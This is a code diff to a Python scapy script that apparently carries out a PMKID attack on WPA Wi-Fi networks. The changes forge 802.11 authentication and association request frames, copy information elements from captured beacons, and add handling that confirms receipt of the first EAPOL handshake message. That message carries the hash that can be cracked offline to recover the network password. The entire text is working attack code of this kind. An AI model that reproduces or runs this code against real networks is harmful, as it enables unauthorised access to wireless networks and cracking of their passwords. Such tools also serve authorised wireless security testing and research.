@@ -35,6 +35,15 @@ from scapy.layers.eap   import EAPOL
 
 pull = PULL()
 
+class Dot11EltEssid(Dot11Elt):
+
+	def mysummary(self):
+		if self.ID == 0:
+			ssid = self.info
+			return "SSID=%s" % ssid, [Dot11]
+		else:
+			return ""
+
 class PMKID:
 
 	__AUTHRUNNER = True
@@ -110,22 +119,42 @@ class PMKID:
 		return pkt
 
 	def forge_asso_frame(self, ap, cl):
-		capibility = self.beacon.sprintf("{Dot11Beacon:%Dot11Beacon.cap%}")
+		cap = self.beacon.getlayer(Dot11Beacon).cap
 
-		forger = self.beacon
+		forger = self.beacon.copy()
 		payload = forger.getlayer(3).payload
-		forger.getlayer(1).remove_payload()
-		#payload.getlayer(1).remove_payload()
+		payload.getlayer(0).remove_payload()
 
 		pkt = RadioTap() / Dot11(
-							subtype=3,
+							subtype=0,
 							type=0,
 							addr1=ap,
 							addr2=cl,
 							addr3=ap,
-						) / Dot11AssoReq(cap="short-slot+res12+ESS+privacy+short-preamble", listen_interval=3) / payload
+						) / Dot11AssoReq(cap="short-slot+ESS+privacy+short-preamble", listen_interval=0x00a) / payload
 
-		pkt.show()
+		extlayers = []
+		eltlayers = self.beacon.getlayer(Dot11Elt)
+
+		counter = 0
+		possibilities = (1, 50, 48, 45, 127, 59, 221)
+		layer = eltlayers.getlayer(counter)
+		while layer:
+			if hasattr(layer, "ID"):
+				identifier = getattr(layer, "ID")
+				if identifier in possibilities:
+					clayer = layer.copy()
+					clayer[0].remove_payload()
+					extlayers.append(clayer)
+			counter += 1
+			layer = eltlayers.getlayer(counter)
+
+		for layer in extlayers:
+			pkt /= layer
+
+		#pkt.show()
+
+		#sys.exit()
 
 		return pkt
 
@@ -226,30 +255,56 @@ class PMKID:
 					pull.GREEN
 				)
 
-				raise KeyboardInterrupt()
+				#raise KeyboardInterrupt()
+
+		elif pkt.haslayer(EAPOL):
+			retval = self.extract_sn_rc(pkt)
+			sn     = retval[0]
+			rc     = retval[1]
+
+			#print("EAPOL Received!")
+
+			if sn == self.bssid and rc == self.myaddress:
+				pull.print(
+					"$",
+					"EAPOL (1 of 4). [{status}] ({apvendor}) {ap} <--> ({stavendor}) {sta} ({essid})".format(
+						status=pull.GREEN+"Confirmed!"+pull.END,
+						apvendor=pull.DARKCYAN+pull.get_mac(self.bssid)+pull.END,
+						ap=self.bssid.upper(),
+						stavendor=pull.DARKCYAN+pull.get_mac(self.myaddress)+pull.END,
+						sta=self.myaddress.upper(),
+						essid=pull.YELLOW+self.essid+pull.END
+					),
+					"\r",
+					pull.GREEN
+				)
+
+				#raise ValueError()
 
 	def engage(self):
 		self.myaddress  = self.get_my_address()
 		auth_frame = self.forge_auth_frame( self.bssid, self.myaddress )
 		asso_frame = self.forge_asso_frame( self.bssid, self.myaddress )
 
-		t = threading.Thread(target=self.auth_sender, args=(auth_frame,))
-		t.daemon = True
-		t.start()
 
-		sniff(iface=self.interface, prn=self.auth_receiver)
+		while self.__EAPOSTATUS:
+			t = threading.Thread(target=self.auth_sender, args=(auth_frame,))
+			t.daemon = True
+			t.start()
 
-		self.__AUTHRUNNER = False
-		#while self.__AUTHSTATUS:
-		#	pass
+			sniff(iface=self.interface, prn=self.auth_receiver)
 
-		t = threading.Thread(target=self.asso_sender, args=(asso_frame,))
-		t.daemon = True
-		t.start()
+			self.__AUTHRUNNER = False
+			while self.__AUTHSTATUS:
+				pass
 
-		sniff(iface=self.interface, prn=self.asso_receiver)
+			t = threading.Thread(target=self.asso_sender, args=(asso_frame,))
+			t.daemon = True
+			t.start()
 
-		self.__ASSORUNNER = False
-		while self.__ASSOSTATUS:
-			pass
+			sniff(iface=self.interface, prn=self.asso_receiver)
+
+			self.__ASSORUNNER = False
+			while self.__ASSOSTATUS:
+				pass
 
